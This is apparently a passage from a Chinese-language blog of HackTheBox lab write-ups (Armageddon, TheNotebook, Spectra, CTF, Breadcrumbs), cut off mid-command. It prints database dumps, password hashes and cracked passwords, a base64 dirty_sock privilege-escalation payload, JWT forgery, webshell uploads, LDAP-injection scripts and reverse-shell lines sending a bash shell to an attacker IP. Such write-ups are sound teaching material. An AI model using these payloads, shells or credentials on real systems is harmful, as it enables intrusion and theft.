123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990meterpreter &gt; shellProcess 15701 created.Channel 3 created.mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'Databaseinformation_schemadrupalmysqlperformance_schemamysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;'Tables_in_drupalactionsauthmapbatchblockblock_customblock_node_typeblock_roleblocked_ipscachecache_blockcache_bootstrapcache_fieldcache_filtercache_formcache_imagecache_menucache_pagecache_pathcommentdate_format_localedate_format_typedate_formatsfield_configfield_config_instancefield_data_bodyfield_data_comment_bodyfield_data_field_imagefield_data_field_tagsfield_revision_bodyfield_revision_comment_bodyfield_revision_field_imagefield_revision_field_tagsfile_managedfile_usagefilterfilter_formatfloodhistoryimage_effectsimage_stylesmenu_custommenu_linksmenu_routernodenode_accessnode_comment_statisticsnode_revisionnode_typequeuerdf_mappingregistryregistry_filerolerole_permissionsearch_datasetsearch_indexsearch_node_linkssearch_totalsemaphoresequencessessionsshortcut_setshortcut_set_userssystemtaxonomy_indextaxonomy_term_datataxonomy_term_hierarchytaxonomy_vocabularyurl_aliasusersusers_rolesvariablewatchdogmysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'name passbrucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURtxxx $S$DI52S2zZ320vMjAEO3vxTKgdj5UziV14k0NFw6kYPHqs5Nu8Ms3ltest $S$D.IOIlykw9g/w/fUw3yHX5x6ZYaDq6x8axUTGdHMdCaRQ.lX6EZW hash crack得到的密码hash破解出来brucetherealadmin的密码： 12345678910➜ Desktop sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash1.txt[sudo] password for miao:Using default input encoding: UTF-8Loaded 1 password hash (Drupal7, $S$ [SHA512 256&#x2F;256 AVX2 4x])Cost 1 (iteration count) is 32768 for all loaded hashesWill run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusbooboo (?)1g 0:00:00:00 DONE (2021-03-22 09:42) 2.222g&#x2F;s 515.5p&#x2F;s 515.5c&#x2F;s 515.5C&#x2F;s tiffany..harleyUse the &quot;--show&quot; option to display all of the cracked passwords reliably user flag得到的用户名密码直接ssh登录，得到user.txt: 提权信息sudo -l发现snap，搜索发现相关漏洞： snapd &lt; 2.37 (Ubuntu) - ‘dirty_sock’ Local Privilege Escalation (2) - Linux local Exploithttps://www.exploit-db.com/exploits/46362 提权 &amp; root flagpy脚本不适用当前情况，只需要把base64提取出来手动利用(有时候利用完su提示没有dirty_sock用户，需要reset机器)： 1234567 python2 -c &#39;print &quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J&#x2F;e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET&#x2F;XVLOZmGVXmojv&#x2F;IHq2fZcc&#x2F;VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA&#x2F;Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot; + &quot;A&quot;*4256 + &quot;&#x3D;&#x3D;&quot;&#39; | base64 -d &gt; miao.snap sudo &#x2F;usr&#x2F;bin&#x2F;snap install --devmode miao.snap [brucetherealadmin@armageddon tmp]$ su dirty_sock# 密码就是dirty_sock[dirty_sock@armageddon tmp]$ sudo -i 参考资料 Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - ‘Drupalgeddon2’ Remote Code Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/44449 snapd &lt; 2.37 (Ubuntu) - ‘dirty_sock’ Local Privilege Escalation (2) - Linux local Exploithttps://www.exploit-db.com/exploits/46362 HTB Armageddon (Root) | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Armageddon-Root Armageddon Writeuphttps://0xsakthi.blogspot.com/2021/03/armageddon-writeup.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"TheNotebook - HackTheBox","slug":"TheNotebook-HackTheBox","date":"2021-03-08T08:17:39.000Z","updated":"2021-08-03T00:36:18.055Z","comments":true,"path":"2021/03/08/TheNotebook-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/03/08/TheNotebook-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/320 10.10.10.230 端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV 10.10.10.230Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 14:21 CSTNmap scan report for 10.10.10.230Host is up (0.068s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)| 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)|_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: The Notebook - Your Note Keeper10010/tcp filtered rxapiService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.82 seconds 80The Notebook,有注册和登录： JWT随意注册登录，可以发现是jwt，并且注意jwt中kid参数，另外注册的普通用户admin_cap是0，应该就是需要攻击JWT成为admin： jwt to admin所以可以自己生成一对公私钥，去JWT.io修改参数，粘贴公私钥，生成jwt： (Jwt的key server应该要一直开着，因为发现每次请求都会有一次对key的请求) 12345678910111213141516171819ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key# Don&#39;t add passphraseopenssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pubcat jwtRS256.keycat jwtRS256.key.pub# header&#123; &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;kid&quot;: &quot;http:&#x2F;&#x2F;10.10.14.12:7777&#x2F;jwtRS256.key&quot;&#125;# data&#123; &quot;username&quot;: &quot;miao&quot;, &quot;email&quot;: &quot;miao@test.com&quot;, &quot;admin_cap&quot;: 1&#125; admin panelAdmin可以上传文件，可以直接上传php，得到webshell： backup然后通过已有shell翻文件，发现一个home.tar.gz(为了方便操作用的蚁剑shell，蚁剑牛逼): 下载下来后解压发现就是noah用户的home目录备份，里面得到ssh密钥： user flag然后直接使用这个私钥ssh登录noah用户，得到user.txt: 提权信息Sudo -l发现只有通过docker操作特定容器的权限，那应该是考察docker逃逸了： docker逃逸 &amp;&amp; root flag就是runc逃逸： https://github.com/Frichetten/CVE-2019-5736-PoC 修改payload，编译上传，触发执行： 1234567var payload &#x3D; &quot;#!&#x2F;bin&#x2F;bash \\n bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.12&#x2F;4444 &lt;&amp;1&quot;# 编译CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64 go build main.go# 另一个终端里去触发sudo &#x2F;usr&#x2F;bin&#x2F;docker exec -it webapp-dev01 &#x2F;bin&#x2F;sh 另一个终端去触发： 触发后执行payload，逃逸成功，得到root.txt: 参考资料 https://github.com/cdk-team/CDK/wiki/CDK-Home-CN https://github.com/Frichetten/CVE-2019-5736-PoC TheNotebook - Page 2 | RaidForumshttps://raidforums.com/Thread-TRADING-TheNotebook?page=2 TheNotebook writeup | RaidForumshttps://raidforums.com/Thread-Tutorial-TheNotebook-writeup","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Spectra - HackTheBox","slug":"Spectra-HackTheBox","date":"2021-03-01T08:01:29.000Z","updated":"2021-06-28T00:39:02.623Z","comments":true,"path":"2021/03/01/Spectra-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/03/01/Spectra-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/317 10.10.10.229 端口扫描22,80,3306,8081: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051$ nmap -sC -sV 10.10.10.229Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 15:07 CSTNmap scan report for 10.10.10.229Host is up (0.078s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.1 (protocol 2.0)| ssh-hostkey:|_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)80/tcp open http nginx 1.17.4|_http-server-header: nginx/1.17.4|_http-title: Site doesn't have a title (text/html).3306/tcp open mysql MySQL (unauthorized)|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)8081/tcp open blackice-icecap?| fingerprint-strings:| FourOhFourRequest:| HTTP/1.1 200 OK| Content-Type: text/plain| Date: Mon, 01 Mar 2021 07:08:23 GMT| Connection: close| Hello World| GetRequest:| HTTP/1.1 200 OK| Content-Type: text/plain| Date: Mon, 01 Mar 2021 07:08:22 GMT| Connection: close| Hello World| HTTPOptions:| HTTP/1.1 200 OK| Content-Type: text/plain| Date: Mon, 01 Mar 2021 07:08:30 GMT| Connection: close|_ Hello World1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8081-TCP:V=7.91%I=7%D=3/1%Time=603C92E7%P=x86_64-apple-darwin19.6.0SF:%r(GetRequest,71,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plainSF:\\r\\nDate:\\x20Mon,\\x2001\\x20Mar\\x202021\\x2007:08:22\\x20GMT\\r\\nConnectionSF::\\x20close\\r\\n\\r\\nHello\\x20World\\n\")%r(FourOhFourRequest,71,\"HTTP/1\\.1\\SF:x20200\\x20OK\\r\\nContent-Type:\\x20text/plain\\r\\nDate:\\x20Mon,\\x2001\\x20MSF:ar\\x202021\\x2007:08:23\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nHello\\x20WSF:orld\\n\")%r(HTTPOptions,71,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Type:\\x20tSF:ext/plain\\r\\nDate:\\x20Mon,\\x2001\\x20Mar\\x202021\\x2007:08:30\\x20GMT\\r\\nCSF:onnection:\\x20close\\r\\n\\r\\nHello\\x20World\\n\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 61.25 seconds 8080是Issue Tracking，两个链接，先加一下hosts： 110.10.10.229 spectra.htb 8081一个helloworld： spectra.htbtestingtesting是database error： main一个wordpress,得到用户名： 目录遍历直接访问testing目录，得到一些文件，其中有个wp-config.php.save文件得到配置信息： 1234567define( &#39;DB_NAME&#39;, &#39;dev&#39; );&#x2F;** MySQL database username *&#x2F;define( &#39;DB_USER&#39;, &#39;devtest&#39; );&#x2F;** MySQL database password *&#x2F;define( &#39;DB_PASSWORD&#39;, &#39;devteam01&#39; ); wordpress账号密码组合，登录： 1administrator:devteam01 getshell手动通过插件或者msf直接打： 简单看一下，opt目录下发现个配置文件，里面是从指定目录读取password文件，然后去对应目录得到密码,顺便查看home目录得到用户名： 12345678SummerHereWeCome!!ls &#x2F;homechronoskatienginxrootuser /opt/autologin.conf.orig123456789101112131415161718192021222324252627# Copyright 2016 The Chromium OS Authors. All rights reserved.# Use of this source code is governed by a BSD-style license that can be# found in the LICENSE file.description &quot;Automatic login at boot&quot;author &quot;chromium-os-dev@chromium.org&quot;# After boot-complete starts, the login prompt is visible and is accepting# input.start on started boot-completescript passwd&#x3D; # Read password from file. The file may optionally end with a newline. for dir in &#x2F;mnt&#x2F;stateful_partition&#x2F;etc&#x2F;autologin &#x2F;etc&#x2F;autologin; do if [ -e &quot;$&#123;dir&#125;&#x2F;passwd&quot; ]; then passwd&#x3D;&quot;$(cat &quot;$&#123;dir&#125;&#x2F;passwd&quot;)&quot; break fi done if [ -z &quot;$&#123;passwd&#125;&quot; ]; then exit 0 fi # Inject keys into the login prompt. # # For this to work, you must have already created an account on the device. # Otherwise, no login prompt appears at boot and the injected keys do the # wrong thing. &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;inject-keys.py -s &quot;$&#123;passwd&#125;&quot; -k enterend script user flag然后katie使用得到的密码ssh登录，得到user flag: 提权信息Sudo -l得到/sbin/initctl， 我们可以直接自定义一个配置文件执行： 提权 &amp;&amp; root flag直接自定义配置文件，里面把bash加上suid(之后记得改回来)： root flag然后root目录得到root.txt: /etc/init/test.conf12345scriptchmod +s &#x2F;bin&#x2F;bashend script 参考资料 HTB Spectra free ssh pass and little walkthrough | RaidForumshttps://raidforums.com/Thread-Free-Flag-HTB-Spectra-free-ssh-pass-and-little-walkthrough [HTB]Spectra Hackthebox writeup – Hackingwebservicehttps://hackingwebservice.wordpress.com/2021/02/28/htbspectra-hackthebox-writeup/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"CTF - HackTheBox","slug":"CTF-HackTheBox","date":"2021-02-25T08:04:50.000Z","updated":"2021-02-25T08:07:02.176Z","comments":true,"path":"2021/02/25/CTF-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/02/25/CTF-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/172 10.10.10.122 端口扫描22和80: 12345678910111213141516171819➜ ~ nmap -sC -sV 10.10.10.122Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 22:57 ESTNmap scan report for 10.10.10.122Host is up (0.050s latency).Not shown: 971 filtered ports, 27 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)| 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)|_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16|_http-title: CTFService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 58.89 seconds 8080给出信息需要登录，禁止爆破： 登录是用户名和OTP： LDAP根据页面注释信息，应该是ldap： 另外搜索81 digits token可以知道是CTF(compressed token format) ldap注入就是ldap注入，’*’需要二次编码，用户名不存在会提示User xxx not found,存在提示Cannot login,利用这个得到用户名： 最终得到用户名是ldapuser ldap枚举同样的方式，枚举出存在的属性： https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt 12345678910Attribute found cnAttribute found commonNameAttribute found mailAttribute found nameAttribute found objectClassAttribute found pagerAttribute found snAttribute found surnameAttribute found uidAttribute found userPassword 其他都是常见的，除了pager，在pager里可以得到OTP token： 1Token: 285449490011357156531651545652335570713167411445727140604172141456711102716717000 attribute.py12345678910111213141516#!/usr/bin/pythonfrom requests import postfrom urllib import quoteimport stringurl = \"http://10.10.10.122/login.php\"chars = string.ascii_lowercaseattrs = open('attributes.txt').readlines()for i in attrs: payload = 'ldapuser)(&#123;&#125;=*'.format(i.strip()) payload = quote(payload) data = &#123; 'inputUsername' : payload, 'inputOTP' : 'htb' &#125; res = post( url, data = data ) if 'Cannot login' in res.content: print \"Attribute found \" + i pager.py1234567891011121314151617181920212223#!/usr/bin/pythonfrom requests import postfrom urllib import quoteimport stringfrom time import sleepurl = \"http://10.10.10.122/login.php\"chars = string.digitstoken = []k = 81while k &gt; 0 : for i in chars: payload = 'ldapuser)(pager=&#123;&#125;*'.format(''.join(token) + i) payload = quote(payload) data = &#123; 'inputUsername' : payload, 'inputOTP' : 'htb' &#125; sleep(1) res = post( url, data = data ) if 'Cannot login' in res.content: token.append(i) k = k - 1 print \"Token: \" + ''.join(token) break OTP根据之前的搜索信息，可以用stoken导入token生成OTP，因为OTP和时间相关，需要加上服务器和本地的时间差值,(或者直接修改时区)： 计算出otp，成功登录： 12stoken --token&#x3D;285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin&#x3D;000060522474 登录进去可以执行命令，同样需要otp, 但提示需要root或者adm才能执行命令： 二阶LDAP注入就是00截断： 123456789login: (&amp;(uid&#x3D;$username)(pager&#x3D;*))admin: (&amp;(uid&#x3D;$username)(group&#x3D;&#39;Admin&#39;))# 如果使用ldapuser))%00login: (&amp;(uid&#x3D;ldapuser))%00)(pager&#x3D;*))admin: (&amp;(uid&#x3D;ldapuser))%00)(group&#x3D;&#39;Admin&#39;))# 会变成login: (&amp;(uid&#x3D;ldapuser))admin: (&amp;(uid&#x3D;ldapuser)) admin登录时用户名使用’ldapuser%29%29%29%00’,成功登录，可以执行命令： info然后直接查看php文件，得到ldap用户名密码： 1ldapuser : e398e27d5c4ad45086fe431120932a01 user flag使用这个密码ssh登录，得到user.txt: 提权信息backup可以看到根目录有个backup目录，里面有一些zip文件，一个error.log和honeypot.sh: 查看sh文件内容，里面用7za压缩uploads目录里的文件，并且-snl忽略软链接（只处理软链接文件，不处理指向文件），’– *’表明前面的已经处理完，星号作为文件名通配符 但7z支持7z @listfile这种方式，您可以为特殊列表文件（包含文件列表的文件）提供一个或多个文件名或通配符。此类列表文件中的文件名必须用换行符号分隔，由于--，列表文件只能提供要使用的文件 利用方式结合这些信息，可以在/uploads/目录里创建两个文件： 1@miao miao miao是软链接，指向/root/root.txt 这样当压缩时，执行的是： 1234567za a &#x2F;backup&#x2F;$filename.zip -t7z -snl -p$pass -- * 7za a &#x2F;backup&#x2F;$filename.zip -t7z -snl -p$pass -- @miao miao# 7za会认为@miao是listfile，替换成miao的内容,miao是到root.txt的软链接，所以就变成了7za a &#x2F;backup&#x2F;$filename.zip -t7z -snl -p$pass -- [root flag] miao# 7za尝试压缩[root flag] miao，但因为不存在[root flag]，导致产生错误日志，其中包含[root flag]# 我们可以tail -f error.log来在日志清空之前得到内容 honeypot.sh1234567891011121314151617181920212223# get banned ips from fail2ban jails and update banned.txt# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]&#123;1,3&#125;\\.[0-9]&#123;1,3&#125;\\.[0-9]&#123;1,3&#125;\\.[0-9]&#123;1,3&#125;' | sort -u &gt; /var/www/html/banned.txt# awk '$1=$1' ORS='&lt;br&gt;' /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt# some vars in order to be sure that backups are protectednow=$(date +\"%s\")filename=\"backup.$now\"pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '&#123;print $1&#125;')# keep only last 10 backupscd /backupls -1t *.zip | tail -n +11 | xargs rm -f# get the files from the honeypot and backup 'em allcd /var/www/html/uploads7za a /backup/$filename.zip -t7z -snl -p$pass -- *# cleaup the honeypotrm -rf -- *# comment the next line to get errors for debuggingtruncate -s 0 /backup/error.log exploit &amp;&amp; root flagapache shellldapuser不能访问uploads目录，需要从前面的otp那里打apache shell，有防火墙，只能443端口： 1bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.6&#x2F;443 &lt;&amp;1 exploit12touch @miaoln -sf &#x2F;root&#x2F;root.txt miao 等待备份执行，error log得到root flag： 参考资料 PayloadsAllTheThings/LDAP Injection at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt https://www.hackthebox.eu/home/machines/writeup/172 HTB: CTF | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/07/20/htb-ctf.html#exploit-it HackTheBox - CTF - YouTubehttps://www.youtube.com/watch?v=51JQg202csw&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Breadcrumbs - HackTheBox","slug":"Breadcrumbs-HackTheBox","date":"2021-02-23T04:51:23.000Z","updated":"2021-07-19T01:01:44.972Z","comments":true,"path":"2021/02/23/Breadcrumbs-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/02/23/Breadcrumbs-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/316 10.10.10.228 端口扫描22,80,443,3306加一些windows常规端口： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$ nmap -sC -sV 10.10.10.228Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 13:43 CSTNmap scan report for 10.10.10.228Host is up (0.068s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey:| 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)| 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)|_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1|_http-title: Library135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1|_http-title: Library| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1445/tcp open microsoft-ds?3306/tcp open mysql?| fingerprint-strings:| ms-sql-s:|_ Host '10.10.14.7' is not allowed to connect to this MariaDB server|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=2/22%Time=6033448D%P=x86_64-apple-darwin19.6.SF:0%r(ms-sql-s,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20notSF:\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-02-22T05:43:45|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 54.72 seconds 80/443一个图书馆网站： 目录扫描目录扫描可以得到一些其他目录： 1234567891011gobuster dir -u http:&#x2F;&#x2F;10.10.10.228&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt -t 50&#x2F;books (Status: 301)&#x2F;css (Status: 301)&#x2F;db (Status: 301)&#x2F;includes (Status: 301)&#x2F;index.php (Status: 200)&#x2F;js (Status: 301)&#x2F;php (Status: 301)&#x2F;portal (Status: 301) 目录遍历这些目录直接访问可以得到文件名，结合后面的LFI读源码： portalportal可以注册登录，同样可以根据文件名结合后面的LFI： LFIsearchsearch除了输入的title和author外还有个method参数，直接将其修改为你1得到报错信息： 缺少book参数，手动添加可以看出是直接去读取文件内容： lfi就是一步步读源码，得到cookie和JWT相关生成信息： 123456789101112131415161718192021222324252627282930book&#x3D;..&#x2F;index.phpbook&#x3D;..&#x2F;php&#x2F;books.phpbook&#x3D;..&#x2F;includes&#x2F;bookController.phpbook&#x3D;..&#x2F;db&#x2F;db.php&lt;?php$host&#x3D;&quot;localhost&quot;;$port&#x3D;3306;$user&#x3D;&quot;bread&quot;;$password&#x3D;&quot;jUli901&quot;;$dbname&#x3D;&quot;bread&quot;;$con &#x3D; new mysqli($host, $user, $password, $dbname, $port) or die (&#39;Could not connect to the database server&#39; . mysqli_connect_error());?&gt;book&#x3D;..&#x2F;portal&#x2F;login.phpbook&#x3D;..&#x2F;portal&#x2F;authController.phpsession_id(makesession($username));session_start();$secret_key &#x3D; &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39;; $jwt &#x3D; JWT::encode($payload, $secret_key, &#39;HS256&#39;);function makesession($username)&#123; $max &#x3D; strlen($username) - 1; $seed &#x3D; rand(0, $max); $key &#x3D; &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528.\\&#x2F;9890&quot;; $session_cookie &#x3D; $username.md5($key); return $session_cookie;&#125; portal admin在admins里可以看到admin用户信息，然后选一个根据已有信息生成对应的sesssionid和JWT： 1PHPSESSID&#x3D;paul47200b180ccd6835d25d034eeb6e6390; token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU 文件上传现在是管理员权限，可以使用管理员功能例如文件上传，提示只支持zip文件但可以简单的burp修改上传： 直接上传html会默认是zip后缀： 需要添加有效数据，直接参考已有的复制就可以，然后修改后缀名为php： 现在我们有webshell： 信息windows的机器，为了方便加载个meterpreter： 简单的翻一下目录，在一个json里得到juliette用户密码： juliette.json123456789101112type juliette.json&#123; \"pizza\" : \"margherita\", \"size\" : \"large\", \"drink\" : \"water\", \"card\" : \"VISA\", \"PIN\" : \"9890\", \"alternate\" : &#123; \"username\" : \"juliette\", \"password\" : \"jUli901./())!\", &#125;&#125; user flag然后直接ssh连接，桌面得到user.txt: StickyNotes根据todo.html里的信息，去StickyNotes目录下载相应文件查看： 1cd %LocalAppData%\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState passwords然后直接查看sqlite，得到几条密码： 123juliette: jUli901.&#x2F;())!development: fN3)sN5Ee@gadministrator: [MOVED] Development然后以development用户登录，C盘Development目录下有个二进制文件，同样下载下来分析： Krypter_Linux看起来是自定义的密码管理工具，给出了curl相关参数： Krypter查看端口发现本机开着1234端口，就是上面看到的密码管理相关端口，可以转发端口出来后curl测试,得到一个aes key： 12345678910111213TCP 127.0.0.1:1234 0.0.0.0:0 LISTENING 2856ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228curl 